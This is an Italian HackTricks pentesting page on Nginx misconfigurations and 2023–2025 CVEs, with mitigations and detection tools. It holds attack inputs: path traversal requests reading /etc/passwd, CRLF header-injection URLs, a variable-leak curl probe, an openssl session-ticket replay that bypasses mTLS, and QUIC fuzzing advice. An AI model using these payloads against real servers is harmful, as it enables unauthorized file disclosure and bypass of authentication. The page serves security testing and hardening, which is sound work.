# Nginx

{{#include ../../banners/hacktricks-training.md}}


## Posizione root mancante <a href="#missing-root-location" id="missing-root-location"></a>

Quando si configura il server Nginx, la **root directive** svolge un ruolo cruciale definendo la directory di base da cui vengono serviti i file. Considera l'esempio seguente:
```bash
server {
root /etc/nginx;

location /hello.txt {
try_files $uri $uri/ =404;
proxy_pass http://127.0.0.1:8080/;
}
}
```
In questa configurazione, `/etc/nginx` è designata come directory root. Questa impostazione permette l'accesso ai file all'interno della directory root specificata, come `/hello.txt`. È però fondamentale notare che è definita solo una specifica location (`/hello.txt`). Non c'è alcuna configurazione per la location root (`location / {...}`). Questa omissione significa che la direttiva root si applica globalmente, permettendo alle richieste al percorso root `/` di accedere ai file sotto `/etc/nginx`.

Da questa configurazione deriva una considerazione critica di sicurezza. Una semplice richiesta `GET`, come `GET /nginx.conf`, potrebbe esporre informazioni sensibili servendo il file di configurazione di Nginx situato in `/etc/nginx/nginx.conf`. Impostare la root su una directory meno sensibile, come `/etc`, potrebbe mitigare questo rischio, ma potrebbe comunque permettere l'accesso non intenzionale ad altri file critici, inclusi altri file di configurazione, log di accesso e persino credenziali cifrate usate per HTTP basic authentication.

## Misconfigurazione Alias LFI <a href="#alias-lfi-misconfiguration" id="alias-lfi-misconfiguration"></a>

Nei file di configurazione di Nginx, è necessaria un'attenta ispezione delle direttive "location". Una vulnerabilità nota come Local File Inclusion (LFI) può essere introdotta involontariamente tramite una configurazione che somiglia alla seguente:
```
location /imgs {
alias /path/images/;
}
```
Questa configurazione è vulnerabile ad attacchi LFI perché il server interpreta richieste come `/imgs../flag.txt` come un tentativo di accedere a file al di fuori della directory prevista, risolvendo di fatto in `/path/images/../flag.txt`. Questa falla permette agli attaccanti di recuperare file dal filesystem del server che non dovrebbero essere accessibili via web.

Per mitigare questa vulnerabilità, la configurazione dovrebbe essere adattata in modo da:
```
location /imgs/ {
alias /path/images/;
}
```
Maggiori informazioni: [https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/](https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/)

Test di Accunetix:
```
alias../ => HTTP status code 403
alias.../ => HTTP status code 404
alias../../ => HTTP status code 403
alias../../../../../../../../../../../ => HTTP status code 400
alias../ => HTTP status code 403
```
## Restrizione di percorso non sicura <a href="#unsafe-variable-use" id="unsafe-variable-use"></a>

Consulta la pagina seguente per imparare come eseguire il bypass di direttive come:
```plaintext
location = /admin {
deny all;
}

location = /admin/ {
deny all;
}
```
{{#ref}}
../../pentesting-web/proxy-waf-protections-bypass.md
{{#endref}}

## Uso non sicuro delle variabili / HTTP Request Splitting <a href="#unsafe-variable-use" id="unsafe-variable-use"></a>

> [!CAUTION]
> Variabili vulnerabili `$uri` e `$document_ur`i e questo può essere risolto sostituendole con `$request_uri`.
>
> Anche una regex può essere vulnerabile, ad esempio:
>
> `location ~ /docs/([^/])? { … $1 … }` - Vulnerabile
>
> `location ~ /docs/([^/\s])? { … $1 … }` - Non vulnerabile (controllo degli spazi)
>
> `location ~ /docs/(.*)? { … $1 … }` - Non vulnerabile

Un esempio che dimostra una vulnerabilità nella configurazione di Nginx è il seguente:
```
location / {
return 302 https://example.com$uri;
}
```
I caratteri `\r` (Carriage Return) e `\n` (Line Feed) indicano i caratteri di nuova linea nelle richieste HTTP, e le loro forme URL-encoded sono rappresentate come `%0d%0a`. Includere questi caratteri in una richiesta (es., `http://localhost/%0d%0aDetectify:%20clrf`) a un server mal configurato fa sì che il server emetta un nuovo header chiamato `Detectify`. Questo accade perché la variabile `$uri` decodifica i caratteri di nuova linea URL-encoded, portando a un header inaspettato nella risposta:
```
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.19.3
Content-Type: text/html
Content-Length: 145
Connection: keep-alive
Location: https://example.com/
Detectify: clrf
```
Per saperne di più sui rischi di CRLF injection e response splitting visita [https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/](https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/).

Questa tecnica è anche [**spiegata in questo talk**](https://www.youtube.com/watch?v=gWQyWdZbdoY&list=PL0xCSYnG_iTtJe2V6PQqamBF73n7-f1Nr&index=77) con alcuni esempi vulnerabili e meccanismi di rilevamento. Per esempio, per rilevare questa misconfigurazione da una prospettiva blackbox puoi usare queste richieste:

- `https://example.com/%20X` - Any HTTP code
- `https://example.com/%20H` - 400 Bad Request

Se vulnerabile, la prima risponderà poiché "X" è qualsiasi metodo HTTP e la seconda restituirà un errore perché H non è un metodo valido. Quindi il server riceverà qualcosa come: `GET / H HTTP/1.1` e questo genererà l'errore.

Altri esempi di rilevamento sarebbero:

- `http://company.tld/%20HTTP/1.1%0D%0AXXXX:%20x` - Any HTTP code
- `http://company.tld/%20HTTP/1.1%0D%0AHost:%20x` - 400 Bad Request

Alcune configurazioni vulnerabili trovate e presentate in quel talk erano:

- Nota come **`$uri`** è mantenuto inalterato nell'URL finale
```
location ^~ /lite/api/ {
proxy_pass http://lite-backend$uri$is_args$args;
}
```
- Nota come ancora una volta **`$uri`** sia nell'URL (questa volta all'interno di un parametro)
```
location ~ ^/dna/payment {
rewrite ^/dna/([^/]+) /registered/main.pl?cmd=unifiedPayment&context=$1&native_uri=$uri break;
proxy_pass http://$back;
```
- Ora in AWS S3
```
location /s3/ {
proxy_pass https://company-bucket.s3.amazonaws.com$uri;
}
```
### Qualsiasi variabile

È stato scoperto che i **dati forniti dall'utente** potrebbero essere trattati come una **variabile Nginx** in determinate circostanze. La causa di questo comportamento rimane in parte elusiva, tuttavia non è rara né semplice da verificare. Questa anomalia è stata evidenziata in un report di sicurezza su HackerOne, consultabile [here](https://hackerone.com/reports/370094). Ulteriori indagini sul messaggio di errore hanno portato all'identificazione della sua insorgenza all'interno del [SSI filter module of Nginx's codebase](https://github.com/nginx/nginx/blob/2187586207e1465d289ae64cedc829719a048a39/src/http/modules/ngx_http_ssi_filter_module.c#L365), individuando Server Side Includes (SSI) come causa principale.

Per **rilevare questa misconfigurazione**, può essere eseguito il comando seguente, che prevede l'impostazione dell'header Referer per testare la stampa delle variabili:
```bash
$ curl -H ‘Referer: bar’ http://localhost/foo$http_referer | grep ‘foobar’
```
Le scansioni per questa misconfigurazione su più sistemi hanno rivelato numerose istanze in cui variabili di Nginx potevano essere stampate da un utente. Tuttavia, la diminuzione del numero di istanze vulnerabili suggerisce che gli sforzi per correggere il problema sono stati in parte efficaci.

### Uso di try_files con variabili $URI$ARGS

La seguente misconfigurazione di Nginx può portare a una vulnerabilità LFI:
```
location / {
try_files $uri$args $uri$args/ /index.html;
}
```
Nella nostra configurazione abbiamo la direttiva `try_files` che viene usata per verificare l'esistenza di file in un ordine specificato. Nginx servirà il primo che trova. La sintassi base della direttiva `try_files` è la seguente:
```
try_files file1 file2 ... fileN fallback;
```
Nginx controllerà l'esistenza di ciascun file nell'ordine specificato. Se un file esiste, verrà servito immediatamente. Se nessuno dei file specificati esiste, la richiesta verrà passata all'opzione di fallback, che può essere un'altra URI o una pagina di errore specifica.

Tuttavia, quando si usano le variabili `$uri$args` in questa direttiva, Nginx cercherà un file che corrisponda alla request URI combinata con eventuali parametri della query string. Perciò possiamo sfruttare questa configurazione:
```
http {
server {
root /var/www/html/public;

location / {
try_files $uri$args $uri$args/ /index.html;
}
}
}
```
Con il seguente payload:
```
GET /?../../../../../../../../etc/passwd HTTP/1.1
Host: example.com
```
Usando il nostro payload sfuggiamo dalla directory radice (definita nella configurazione di Nginx) e carichiamo il file `/etc/passwd`. Nei log di debug possiamo osservare come Nginx prova i file:
```
...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 trying to use file: "/../../../../../../../../etc/passwd" "/var/www/html/public/../../../../../../../../etc/passwd"
2025/07/11 15:49:16 [debug] 79694#79694: *4 try file uri: "/../../../../../../../../etc/passwd"

...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 http filename: "/var/www/html/public/../../../../../../../../etc/passwd"

...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 HTTP/1.1 200 OK

```
PoC contro Nginx usando la configurazione menzionata sopra:
![Example burp request](../../images/nginx_try_files.png)

## Lettura della risposta grezza del backend

Nginx offre una funzionalità tramite `proxy_pass` che permette l'intercettazione degli errori e degli header HTTP prodotti dal backend, con l'obiettivo di nascondere messaggi di errore interni e header. Questo viene ottenuto facendo sì che Nginx serva pagine di errore personalizzate in risposta agli errori del backend. Tuttavia, sorgono problemi quando Nginx incontra una richiesta HTTP non valida. Tale richiesta viene inoltrata al backend così com'è, e la risposta grezza del backend viene poi inviata direttamente al client senza l'intervento di Nginx.

Considera uno scenario di esempio che coinvolge un'applicazione uWSGI:
```python
def application(environ, start_response):
start_response('500 Error', [('Content-Type', 'text/html'), ('Secret-Header', 'secret-info')])
return [b"Secret info, should not be visible!"]
```
Per gestire questo, vengono utilizzate direttive specifiche nella configurazione di Nginx:
```
http {
error_page 500 /html/error.html;
proxy_intercept_errors on;
proxy_hide_header Secret-Header;
}
```
- [**proxy_intercept_errors**](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_intercept_errors): Questa direttiva permette a Nginx di servire una risposta personalizzata per le risposte del backend con un codice di stato maggiore di 300. Garantisce che, per la nostra applicazione uWSGI di esempio, una risposta `500 Error` venga intercettata e gestita da Nginx.
- [**proxy_hide_header**](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_hide_header): Come suggerisce il nome, questa direttiva nasconde intestazioni HTTP specificate al client, migliorando privacy e sicurezza.

Quando viene effettuata una richiesta `GET` valida, Nginx la elabora normalmente, restituendo una risposta di errore standard senza rivelare eventuali intestazioni segrete. Tuttavia, una richiesta HTTP non valida bypassa questo meccanismo, causando l'esposizione delle risposte raw del backend, incluse intestazioni segrete e messaggi di errore.

## merge_slashes impostato su off

Per impostazione predefinita, la **direttiva `merge_slashes`** di Nginx è impostata su **`on`**, il che comprime più slash consecutivi in una URL in un unico slash. Questa funzionalità, pur semplificando l'elaborazione delle URL, può involontariamente nascondere vulnerabilità nelle applicazioni dietro Nginx, in particolare quelle soggette a local file inclusion (LFI). Gli esperti di sicurezza **Danny Robinson and Rotem Bar** hanno evidenziato i potenziali rischi associati a questo comportamento predefinito, specialmente quando Nginx agisce come reverse-proxy.

Per mitigare tali rischi, è consigliabile **disattivare la direttiva `merge_slashes`** per le applicazioni suscettibili a queste vulnerabilità. Questo assicura che Nginx inoltri le richieste all'applicazione senza alterare la struttura della URL, evitando così di mascherare eventuali problemi di sicurezza sottostanti.

For more information check [Danny Robinson and Rotem Bar](https://medium.com/appsflyer/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d).

### **Intestazioni di risposta Maclicious**

Come mostrato in [**this writeup**](https://mizu.re/post/cors-playground), ci sono alcune intestazioni che, se presenti nella risposta del web server, modificheranno il comportamento del proxy Nginx. Le puoi controllare [**in the docs**](https://www.nginx.com/resources/wiki/start/topics/examples/x-accel/):

- `X-Accel-Redirect`: Indica a Nginx di reindirizzare internamente una richiesta verso una posizione specificata.
- `X-Accel-Buffering`: Controlla se Nginx deve bufferizzare la risposta o meno.
- `X-Accel-Charset`: Imposta il set di caratteri per la risposta quando si usa X-Accel-Redirect.
- `X-Accel-Expires`: Imposta il tempo di scadenza per la risposta quando si usa X-Accel-Redirect.
- `X-Accel-Limit-Rate`: Limita la velocità di trasferimento per le risposte quando si usa X-Accel-Redirect.

Ad esempio, l'header **`X-Accel-Redirect`** provocherà un **reindirizzamento** interno in nginx. Quindi avere una configurazione nginx con qualcosa come **`root /`** e una risposta dal web server con **`X-Accel-Redirect: .env`** farà sì che nginx invii il contenuto di **`/.env`** (Path Traversal).

### **Valore predefinito nella direttiva map**

Nella **configurazione Nginx**, la direttiva `map` spesso gioca un ruolo nel **controllo delle autorizzazioni**. Un errore comune è non specificare un valore **default**, il che potrebbe portare ad accessi non autorizzati. Per esempio:
```yaml
http {
map $uri $mappocallow {
/map-poc/private 0;
/map-poc/secret 0;
/map-poc/public 1;
}
}
```

```yaml
server {
location /map-poc {
if ($mappocallow = 0) {return 403;}
return 200 "Hello. It is private area: $mappocallow";
}
}
```
Senza un `default`, un **utente malevolo** può aggirare la sicurezza accedendo a un **URI non definito** all'interno di `/map-poc`. [The Nginx manual](https://nginx.org/en/docs/http/ngx_http_map_module.html) consiglia di impostare un **valore di default** per evitare tali problemi.

### **DNS Spoofing Vulnerability**

DNS spoofing contro Nginx è fattibile in determinate condizioni. Se un attaccante conosce il **DNS server** usato da Nginx e può intercettare le sue query DNS, può falsificare i record DNS. Questo metodo, tuttavia, è inefficace se Nginx è configurato per usare **localhost (127.0.0.1)** per la risoluzione DNS. Nginx permette di specificare un DNS server come segue:
```yaml
resolver 8.8.8.8;
```
### **`proxy_pass` and `internal` Directives**

La **`proxy_pass`** directive è utilizzata per reindirizzare le richieste ad altri server, sia internamente che esternamente. La **`internal`** direttiva garantisce che alcune location siano accessibili solo all'interno di Nginx. Sebbene queste direttive non siano vulnerabilità di per sé, la loro configurazione richiede un'attenta verifica per prevenire falle di sicurezza.

## proxy_set_header Upgrade & Connection

Se il server nginx è configurato per passare gli header Upgrade e Connection, un [**h2c Smuggling attack**](../../pentesting-web/h2c-smuggling.md) potrebbe essere eseguito per accedere a endpoint protetti/interni.

> [!CAUTION]
> Questa vulnerabilità permetterebbe a un attacker di **stabilire una connessione diretta con l'endpoint `proxy_pass`** (`http://backend:9999` in questo caso) il cui contenuto non verrebbe controllato da nginx.

Example of vulnerable configuration to steal `/flag` from [here](https://bishopfox.com/blog/h2c-smuggling-request):
```
server {
listen       443 ssl;
server_name  localhost;

ssl_certificate       /usr/local/nginx/conf/cert.pem;
ssl_certificate_key   /usr/local/nginx/conf/privkey.pem;

location / {
proxy_pass http://backend:9999;
proxy_http_version 1.1;
proxy_set_header Upgrade $http_upgrade;
proxy_set_header Connection $http_connection;
}

location /flag {
deny all;
}
```
> [!WARNING]
> Nota che anche se il `proxy_pass` puntava a uno specifico **percorso** come `http://backend:9999/socket.io` la connessione sarà stabilita con `http://backend:9999` quindi puoi **contattare qualsiasi altro percorso all'interno di quell'endpoint interno. Quindi non importa se un path è specificato nell'URL di proxy_pass.**

## Modulo HTTP/3 QUIC: DoS remoto & leak (2024)

Durante il 2024 Nginx ha divulgato CVE-2024-31079, CVE-2024-32760, CVE-2024-34161 e CVE-2024-35200 mostrando che una **singola sessione QUIC ostile** può mandare in crash i processi worker o causare leak di memoria ogni volta che il modulo sperimentale `ngx_http_v3_module` è compilato e viene esposta una socket `listen ... quic`. Le build impattate sono 1.25.0–1.25.5 e 1.26.0, mentre 1.27.0/1.26.1 includono le patch; la divulgazione di memoria (CVE-2024-34161) richiede inoltre MTU maggiori di 4096 byte per far emergere dati sensibili (dettagli nell'advisory nginx 2024 referenziato sotto).

**Suggerimenti per ricognizione e sfruttamento**

- HTTP/3 è opt-in, quindi scannerizza per risposte `Alt-Svc: h3=":443"` o effettua handshake QUIC brute-force su UDP/443; una volta confermato, fuzzare l'handshake e i frame STREAM con payload custom `quiche-client`/`nghttp3` per causare crash dei worker e forzare leak nei log.
- Esegui rapidamente il fingerprint del supporto del target con:
```bash
nginx -V 2>&1 | grep -i http_v3
rg -n "listen .*quic" /etc/nginx/
```
## Bypass della ripresa della sessione TLS per client cert auth (CVE-2025-23419)

Un advisory di febbraio 2025 ha rivelato che nginx 1.11.4–1.27.3 compilato con OpenSSL consente di **riutilizzare una session TLS 1.3** da un name-based virtual host all'interno di un altro, così un client che ha negoziato un host senza certificato può riutilizzare il ticket/PSK per entrare in un vhost protetto con `ssl_verify_client on;` e saltare completamente mTLS. Il bug si attiva ogni volta che più virtual hosts condividono la stessa cache di session TLS 1.3 e i ticket (vedi l'advisory nginx del 2025 riportato sotto).

**Playbook dell'attaccante**
```bash
# 1. Create a TLS session on the public vhost and save the session ticket
openssl s_client -connect public.example.com:443 -sess_out ticket.pem

# 2. Replay that session ticket against the mTLS vhost before it expires
openssl s_client -connect admin.example.com:443 -sess_in ticket.pem -ign_eof
```
Se il target è vulnerabile, il secondo handshake si completa senza presentare un certificato client, rivelando location protette.

**Cosa verificare**

- Blocchi `server_name` misti che condividono `ssl_session_cache shared:SSL` oltre a `ssl_session_tickets on;`.
- Blocchi Admin/API che si aspettano mTLS ma ereditano impostazioni di session cache/ticket condivise da host pubblici.
- Automazione che abilita la session resumption di TLS 1.3 globalmente (es. Ansible roles) senza considerare l'isolamento dei vhost.

## Resilienza a HTTP/2 Rapid Reset (comportamento CVE-2023-44487)

L'attacco HTTP/2 Rapid Reset (CVE-2023-44487) continua a interessare nginx quando gli operatori aumentano `keepalive_requests` o `http2_max_concurrent_streams` oltre i valori di default: un attacker apre una connessione HTTP/2, la inonda con migliaia di stream, poi invia immediatamente frame `RST_STREAM` in modo che il tetto di concorrenza non venga mai raggiunto mentre la CPU continua a bruciare sulla logica di tear-down. I default di nginx (128 concurrent streams, 1000 keepalive requests) mantengono piccola l'area d'impatto; alzare quei limiti "sostanzialmente" rende banale privare di risorse i worker anche da un singolo client (vedi il write-up F5 referenziato sotto).

**Suggerimenti per il rilevamento**
```bash
# Highlight risky knobs
rg -n "http2_max_concurrent_streams" /etc/nginx/
rg -n "keepalive_requests" /etc/nginx/
```
Gli host che rivelano valori insolitamente elevati per quelle direttive sono obiettivi privilegiati: un client HTTP/2 può ripetere la creazione di stream e inviare istantanei frame `RST_STREAM` per tenere la CPU al massimo senza superare il limite di concorrenza.

## Provalo tu stesso

Detectify ha creato un repository GitHub dove puoi usare Docker per configurare il tuo server di test Nginx vulnerabile con alcune delle misconfigurazioni trattate in questo articolo e provare a individuarle tu stesso!

[https://github.com/detectify/vulnerable-nginx](https://github.com/detectify/vulnerable-nginx)

## Strumenti di analisi statiche

### [GIXY](https://github.com/yandex/gixy)

Gixy è uno strumento per analizzare la configurazione di Nginx. L'obiettivo principale di Gixy è prevenire misconfigurazioni di sicurezza e automatizzare il rilevamento di vulnerabilità.

### [Nginxpwner](https://github.com/stark0de/nginxpwner)

Nginxpwner è uno strumento semplice per cercare comuni misconfigurazioni e vulnerabilità di Nginx.

## Riferimenti

- [**https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/**](https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/)
- [**http://blog.zorinaq.com/nginx-resolver-vulns/**](http://blog.zorinaq.com/nginx-resolver-vulns/)
- [**https://github.com/yandex/gixy/issues/115**](https://github.com/yandex/gixy/issues/115)
- [**https://mailman.nginx.org/pipermail/nginx-announce/2024/GWH2WZDVCOC2A5X67GKIMJM4YRELTR77.html**](https://mailman.nginx.org/pipermail/nginx-announce/2024/GWH2WZDVCOC2A5X67GKIMJM4YRELTR77.html)
- [**https://mailman.nginx.org/pipermail/nginx-announce/2025/NYEUJX7NCBCGJGXDFVXNMAAMJDFSE45G.html**](https://mailman.nginx.org/pipermail/nginx-announce/2025/NYEUJX7NCBCGJGXDFVXNMAAMJDFSE45G.html)
- [**https://www.f5.com/company/blog/nginx/http-2-rapid-reset-attack-impacting-f5-nginx-products**](https://www.f5.com/company/blog/nginx/http-2-rapid-reset-attack-impacting-f5-nginx-products)


{{#include ../../banners/hacktricks-training.md}}
